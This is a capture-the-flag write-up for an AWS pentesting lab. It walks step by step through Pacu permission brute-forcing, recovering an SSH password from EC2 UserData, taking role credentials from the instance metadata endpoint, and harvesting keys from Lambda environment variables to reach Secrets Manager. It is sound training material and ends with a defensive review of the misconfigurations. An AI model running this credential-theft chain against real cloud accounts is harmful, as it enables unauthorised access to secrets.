# Challenge Lab Name: `Data Secrets`
<details open>
<summary><b>Scenario & Overview</b></summary>

> **Platform:** <a href="https://www.hacksmarter.org/" target="_blank" title="Open Hack Smarter Platform"><img src="https://img.shields.io/badge/Hack_Smarter_↗-181717?style=flat&logo=hacksmarter&logoColor=white" style="vertical-align: middle; height: 20px;" alt="Hack Smarter Platform Link"></a> &nbsp;
>
>The Hack Smarter Red Team started offering AWS Pentesting. The client's primary concern is whether an attacker is able to gain access to their Secrets Manager.
>
> Your task is to begin with the starting credentials, and see if you're able to perform lateral movement & privilege escalation to gain access to their AWS Secrets Manager. This is where the final flag is located.

</details>

## Detailed Methodology

<details open>
<summary><b>Initial Access</b></summary>

The initial credentials given were configured into an AWS profile with the command `aws configure --profile data`. I configured the AWS profile with the credentials given, the default region set to **us-east-1**, and the default output as **json**. After configuring the profile I ran the command below to verify that these credentials were valid and to see what IAM user I was. 

```bash
└─$ aws sts get-caller-identity --profile data  
{
    "UserId": "AIDAXJSDKOBLBOFMRMCEP",
    "Account": "501578625110",
    "Arn": "arn:aws:iam::501578625110:user/cg-start-user-lab"
}
```

From the output I could see that the IAM user given was `cg-start-user-lab`.

### Bruteforcing Permissions Using Pacu

I could now start enumerating the permissions for this IAM user, and using Pacu to automate this process. Once I started Pacu, I created a session called **data** and imported the AWS profile configured by running the command `import_keys data`. 

Once the credentials were imported I went ahead and ran the `iam__bruteforce_permissions` with the `--region` flag set to **us-east-1** to reduce the time it takes for the module to complete. 

Once the module was completed I ran `data iam` to view what Pacu found for the IAM user. From the output I could see that the IAM user had permission to describe EC2 instances, which are virtual machines running in the AWS environment. 

```bash
Pacu (data:imported-data) > run iam__bruteforce_permissions --region us-east-1
  Running module iam__bruteforce_permissions...
[iam__bruteforce_permissions] Enumerated IAM Permissions:
[iam__bruteforce_permissions] Enumerating us-east-1
...
Pacu (data-secrets:imported-data) > data iam
{
  "permissions": {
    "allow": [
      "dynamodb:DescribeEndpoints",
      "ec2:DescribeInstances",
      "ec2:DescribeTags",
      "sts:GetSessionToken",
      "sts:GetCallerIdentity"
    ],
    "deny": []
  }
}
```

</details>


<details open>
<summary><b>EC2 Enumeration & SSH Login</b></summary>

To view the EC2 instances in the AWS account I ran `aws ec2 describe-instances --region us-east-1 --profile data` which showed that there was one. Since the output of the command is very long I went ahead and ran the command below to get more of an overview about the EC2 instance. 

```bash
└─$ aws ec2 describe-instances --query "Reservations[].Instances[].[InstanceId,PublicIpAddress,State.Name,KeyName,IamInstanceProfile.Arn]" --profile data
[
    [
        "i-07c9804f663a854dd",
        "44.223.102.55",
        "running",
        null,
        "arn:aws:iam::501578625110:instance-profile/cg-ec2-instance-profile-lab"
    ]
]
```

The output showed me that the EC2 instance was running and it had the public IP address of `44.223.102.55`. With this I went ahead and checked to see what services were running on the machine by using Nmap. 

<details>
<summary><b>Describe EC2 Instances Long Format Output</b></summary>

```bash
└─$ 
{
    "Reservations": [
        {
            "ReservationId": "r-03b9454bc6899e31e",
            "OwnerId": "501578625110",
            "Groups": [],
            "Instances": [
                {
                    "Architecture": "x86_64",
                    "BlockDeviceMappings": [
                        {
                            "DeviceName": "/dev/xvda",
                            "Ebs": {
                                "AttachTime": "2026-11-02T15:00:49.495000+00:00",
                                "DeleteOnTermination": true,
                                "Status": "attached",
                                "VolumeId": "vol-01ebb3577c30d08d9",
                                "EbsCardIndex": 0
                            }
                        }
                    ],
                    "ClientToken": "terraform-0osPvipNTaw69fvDLgrxBOGPTH",
                    "EbsOptimized": false,
                    "EnaSupport": true,
                    "Hypervisor": "xen",
                    "IamInstanceProfile": {
                        "Arn": "arn:aws:iam::501578625110:instance-profile/cg-ec2-instance-profile-lab",
                        "Id": "AIPAXJSDKOBLM6QVWTWRA"
                    },
                    "NetworkInterfaces": [
                        {
                            "Association": {
                                "IpOwnerId": "amazon",
                                "PublicDnsName": "",
                                "PublicIp": "44.223.102.55"
                            },
                            "Attachment": {
                                "AttachTime": "2026-11-02T15:00:49+00:00",
                                "AttachmentId": "eni-attach-066e0d3652069fd19",
                                "DeleteOnTermination": true,
                                "DeviceIndex": 0,
                                "Status": "attached",
                                "NetworkCardIndex": 0
                            },
                            "Description": "",
                            "Groups": [
                                {
                                    "GroupId": "sg-0f660e702539711a3",
                                    "GroupName": "cg-sg-lab"
                                }
                            ],
                            "Ipv6Addresses": [],
                            "MacAddress": "02:ff:cd:a6:21:13",
                            "NetworkInterfaceId": "eni-03619757e925d8cc4",
                            "OwnerId": "501578625110",
                            "PrivateIpAddress": "10.0.1.177",
                            "PrivateIpAddresses": [
                                {
                                    "Association": {
                                        "IpOwnerId": "amazon",
                                        "PublicDnsName": "",
                                        "PublicIp": "44.223.102.55"
                                    },
                                    "Primary": true,
                                    "PrivateIpAddress": "10.0.1.177"
                                }
                            ],
                            "SourceDestCheck": true,
                            "Status": "in-use",
                            "SubnetId": "subnet-09f5c6ed6f4916327",
                            "VpcId": "vpc-004b7a6a75309d8cc",
                            "InterfaceType": "interface",
                            "Operator": {
                                "Managed": false
                            }
                        }
                    ],
                    "RootDeviceName": "/dev/xvda",
                    "RootDeviceType": "ebs",
                    "SecurityGroups": [
                        {
                            "GroupId": "sg-0f660e702539711a3",
                            "GroupName": "cg-sg-lab"
                        }
                    ],
                    "SourceDestCheck": true,
                    "Tags": [
                        {
                            "Key": "Name",
                            "Value": "cg-sensitive-ec2-lab"
                        },
                        {
                            "Key": "Scenario",
                            "Value": "scenario_template"
                        },
                        {
                            "Key": "Stack",
                            "Value": "CloudGoat"
                        }
                    ],
                    "VirtualizationType": "hvm",
                    "CpuOptions": {
                        "CoreCount": 1,
                        "ThreadsPerCore": 2
                    },
                    "CapacityReservationSpecification": {
                        "CapacityReservationPreference": "open"
                    },
                    "HibernationOptions": {
                        "Configured": false
                    },
                    "MetadataOptions": {
                        "State": "applied",
                        "HttpTokens": "optional",
                        "HttpPutResponseHopLimit": 1,
                        "HttpEndpoint": "enabled",
                        "HttpProtocolIpv6": "disabled",
                        "InstanceMetadataTags": "disabled"
                    },
                    "EnclaveOptions": {
                        "Enabled": false
                    },
                    "PlatformDetails": "Linux/UNIX",
                    "UsageOperation": "RunInstances",
                    "UsageOperationUpdateTime": "2026-11-02T15:00:49+00:00",
                    "PrivateDnsNameOptions": {
                        "HostnameType": "ip-name",
                        "EnableResourceNameDnsARecord": false,
                        "EnableResourceNameDnsAAAARecord": false
                    },
                    "MaintenanceOptions": {
                        "AutoRecovery": "default",
                        "RebootMigration": "default"
                    },
                    "CurrentInstanceBootMode": "legacy-bios",
                    "NetworkPerformanceOptions": {
                        "BandwidthWeighting": "default"
                    },
                    "Operator": {
                        "Managed": false,
                        "HiddenByDefault": false
                    },
                    "SecondaryInterfaces": [],
                    "InstanceId": "i-07c9804f663a854dd",
                    "ImageId": "ami-0d5399502a6fdc073",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    },
                    "PrivateDnsName": "ip-10-0-1-177.ec2.internal",
                    "PublicDnsName": "",
                    "StateTransitionReason": "",
                    "AmiLaunchIndex": 0,
                    "ProductCodes": [],
                    "InstanceType": "t3.micro",
                    "LaunchTime": "2026-11-02T15:00:49+00:00",
                    "Placement": {
                        "AvailabilityZoneId": "use1-az1",
                        "GroupName": "",
                        "Tenancy": "default",
                        "AvailabilityZone": "us-east-1a"
                    },
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "SubnetId": "subnet-09f5c6ed6f4916327",
                    "VpcId": "vpc-004b7a6a75309d8cc",
                    "PrivateIpAddress": "10.0.1.177",
                    "PublicIpAddress": "44.223.102.55"
                }
            ]
        }
    ]
}
```

</details>

#### Nmap Scanning

I ran the Nmap scan shown below and from the output I could see that the EC2 instance had port 22 open with SSH running. 

```bash
└─$ nmap -Pn -sC -sV 44.223.102.55
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-02 07:10 -0800
Nmap scan report for ec2-44-223-102-55.compute-1.amazonaws.com (44.223.102.55)
Host is up (0.012s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 a7:bb:21:60:d3:ad:18:73:41:f9:41:f1:99:ea:a1:b3 (RSA)
|   256 b7:4f:ab:c8:19:de:73:e7:b2:d4:e7:7b:5d:ef:34:68 (ECDSA)
|_  256 ca:ed:3e:14:9c:9e:80:f0:7c:0e:6d:44:30:66:c0:8f (ED25519)
53/tcp open  domain  (generic dns response: REFUSED)
| dns-nsid: 
|_  id.server: lax05
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.991%I=7%D=11/2%Time=6AE8A7DC%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,1D6,"\x01\xd4\0\x06\x81\x85\0\x01\0\0\0\0\0\x01\x07ve
SF:rsion\x04bind\0\0\x10\0\x03\0\0\)\x04\xd0\0\0\0\0\x01\xab\0\x0c\x01\xa7
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.08 seconds
```

Since the EC2 instance was running SSH service but I didn't have any credentials to log in I went ahead and ran the command below to check the EC2 instance's UserData to see if I could find anything useful. 

```bash
└─$ aws ec2 describe-instance-attribute --instance-id i-07c9804f663a854dd --attribute userData --profile data
{
    "InstanceId": "i-07c9804f663a854dd",
    "UserData": {
        "Value": "IyEvYmluL2Jhc2gKZWNobyAiZWMyLXVzZXI6Q2xvdWRHb2F0SW5zdGFuY2VQYXNzd29yZCEiIHwgY2hwYXNzd2QKc2VkIC1pICdzL1Bhc3N3b3JkQXV0aGVudGljYXRpb24gbm8vUGFzc3dvcmRBdXRoZW50aWNhdGlvbiB5ZXMvZycgL2V0Yy9zc2gvc3NoZF9jb25maWcKc2VydmljZSBzc2hkIHJlc3RhcnQK"
    }
}
```

From the AWS documentation for [UserData](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_UserData.html) I could see that it's encoded in Base64. I then went ahead and used this [recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)) from CyberChef to decode it which showed me the output below:

```bash
#!/bin/bash
echo "ec2-user:CloudGoatInstancePassword!" | chpasswd
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
service sshd restart
```

From here I could see a few things, explained below:
- The `chpasswd` command "reads a list of user name and password pairs from standard input and uses this information to update a  group of existing users".
    - This command showed that **username:password** was updated, which is shown as `ec2-user:CloudGoatInstancePassword!`.
- The sed command with the `-i` flag edits the file in place, in this case the `/etc/ssh/sshd_config` file. 
    - The `s/` is selecting the pattern that will be subsituted and it will be replaced what is after the `/` by using the `/g` for global replacement at the end. To find what this meant I used this [article](https://www.geeksforgeeks.org/linux-unix/sed-command-in-linux-unix-with-examples/).
    - The command let me know that **PasswordAuthentication** is enabled


#### Using SSH to Access the EC2 Instance 

Using the SSH credentials found I logged into the EC2 by running the command `ssh ec2-user@44.223.102.55` and entering the password found earlier. 

After logging in I initially tried using the `curl` command to find any IAM roles attached to the EC2 instance, but it did not provide a role name to view temporary credentials. 

```bash
[ec2-user@ip-10-0-1-177 ~]$ curl http://169.254.169.254/latest/meta-data/iam/
info
```

I then used the `sudo -i` command and I could see that this user had permission to escalate privileges, but this did not provide anything useful for me. 

The next step was checking to see if any AWS credentials were set in the EC2 instance by running the command below.  

```bash
[ec2-user@ip-10-0-1-177 ~]$ aws sts get-caller-identity
{
    "Account": "501578625110", 
    "UserId": "AROAXJSDKOBLJWCUMCZW7:i-07c9804f663a854dd", 
    "Arn": "arn:aws:sts::501578625110:assumed-role/cg-ec2-role-lab/i-07c9804f663a854dd"
}
```

The output showed that there was the IAM user `cg-ec2-role-lab` being assumed. With this role name found I went ahead and used the EC2 instance metadata endpoint to get temporary credentials for this IAM role. 

```bash
[ec2-user@ip-10-0-1-177 ~]$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-lab/
{
  "Code" : "Success",
  "LastUpdated" : "2026-11-02T15:37:28Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "A**************",
  "SecretAccessKey" : "r******************1SA",
  "Token" : c"IQoJb3J****************************8C0hS+qgf",
  "Expiration" : "2026-11-02T21:59:38Z"
```

</details>


<details open>
<summary><b>Privilege Escalation & Listing Secrets</b></summary

Using the temporary credentials provided I went ahead and configured a new AWS profile which I named the same as the IAM role found. 

```bash
└─$ aws sts get-caller-identity --profile cg-ec2-role-lab      
{
    "UserId": "AROAXJSDKOBLJWCUMCZW7:i-07c9804f663a854dd",
    "Account": "501578625110",
    "Arn": "arn:aws:sts::501578625110:assumed-role/cg-ec2-role-lab/i-07c9804f663a854dd"
}
```

Using Pacu I could see that the IAM role being assumed had permission to list Lambda functions. 

```bash
Pacu (data:imported-cg-ec2-role-lab) > run iam__bruteforce_permissions --region us-east-1
  Running module iam__bruteforce_permissions...
[iam__bruteforce_permissions] Enumerated IAM Permissions:
...
Pacu (data:imported-cg-ec2-role-lab) > data iam
{
  "permissions": {
    "allow": [
      "lambda:ListFunctions",
      "dynamodb:DescribeEndpoints",
      "sts:GetCallerIdentity"
    ],
    "deny": []
  }
}
```

I ran the command below to list the Lambda functions attached to this AWS account where I found one named `cg-lambda-function-lab`. 

```bash
└─$ aws lambda list-functions --profile cg-ec2-role-lab
{
    "Functions": [
        {
            "FunctionName": "cg-lambda-function-lab",
            "FunctionArn": "arn:aws:lambda:us-east-1:501578625110:function:cg-lambda-function-lab",
            "Runtime": "python3.9",
            "Role": "arn:aws:iam::501578625110:role/cg-lambda-exec-role-lab",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 221,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2026-11-02T15:00:43.779+0000",
            "CodeSha256": "J7+tACeZu8267g5XEXe/iTlv1Ip9wdtOr/IzHK/W9fc=",
            "Version": "$LATEST",
            "Environment": {
                "Variables": {
                    "DB_USER_ACCESS_KEY": "A************",
                    "DB_USER_SECRET_KEY": "wv************MC1"
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "d4c0ce3f-4bbf-4f11-93c2-ebd2594923ce",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/cg-lambda-function-lab"
            }
        }
    ]
}
```

I configured another AWS profile using the credentials found from the Lambda function's environment variables. Running the command below I could see that I was now the IAM user `cg-lambda-user-lab`. 

```bash
└─$ aws sts get-caller-identity --profile lambda         
{
    "UserId": "AIDAXJSDKOBLGRRS3HNFZ",
    "Account": "501578625110",
    "Arn": "arn:aws:iam::501578625110:user/cg-lambda-user-lab"
}
```

Using Pacu to automate finding the permissions allowed for this IAM user, I could see that they had permission to list secrets from the AWS Secrets Manager. 

```bash
Pacu (data:imported-lambda) > run iam__bruteforce_permissions --region us-east-1
  Running module iam__bruteforce_permissions...
[iam__bruteforce_permissions] Enumerated IAM Permissions:
[iam__bruteforce_permissions] Enumerating us-east-1
...
Pacu (data:imported-lambda) > data iam
{
  "permissions": {
    "allow": [
      "dynamodb:DescribeEndpoints",
      "sts:GetSessionToken",
      "sts:GetCallerIdentity",
      "secretsmanager:ListSecrets"
    ],
    "deny": []
  }
}
```

Using the Pacu module `secrets__enum` module I found that there was a secret named `cg-final-flag-lab`. Pacu then showed that I could view the secrets in the directory specified below. 

```bash
Pacu (data:imported-lambda) > run secrets__enum --regions us-east-1 --secrets-manager --parameter-store
  Running module secrets__enum...
[secrets__enum] Starting region us-east-1...
[secrets__enum]  Found secret: cg-final-flag-lab
[secrets__enum] Probing Secret: cg-final-flag-lab
[secrets__enum] Probing parameter store
[secrets__enum]  FAILURE: 
[secrets__enum]   AccessDeniedException
[secrets__enum]      Could not list parameters... Exiting
[secrets__enum] secrets__enum completed.

[secrets__enum] MODULE SUMMARY:

    1 Secret(s) were found in AWS secretsmanager
'    0 Parameter(s) were found in AWS Systems Manager Parameter Store    
    Check ~/.local/share/pacu/<session name>/downloads/secrets/ to get the values
```
Since the secret found was the challenge flag I won't be showing what was in the `secrets.txt` file. 

</details>

<details open>
<summary><b>Impact & Post-Exploitation Potential</b></summary>

Going through this lab there were a lot of security misconfigurations which led to finding secrets in the AWS Secrets Manager. The most notable misconfigurations to me were the plaintext password stored in the EC2 instance's UserData and then the AWS credentials that were included as environment variables for the Lambda function found. Although it's not recommended for SSH PasswordAuthentication to be enabled, if the password wasn't shown in the EC2's UserData it would have possibly been enough to derail an attacker's movements because of password bruteforcing. AWS credentials stored as environment variables in the Lambda function could have been moved to the AWS Secrets Manager to prevent an IAM user from finding and exploiting this attack path. In the end, a possible number of secrets could have been found to abuse and exploit other services running in the AWS environment or even lead to on-premise attacks. 

</details>
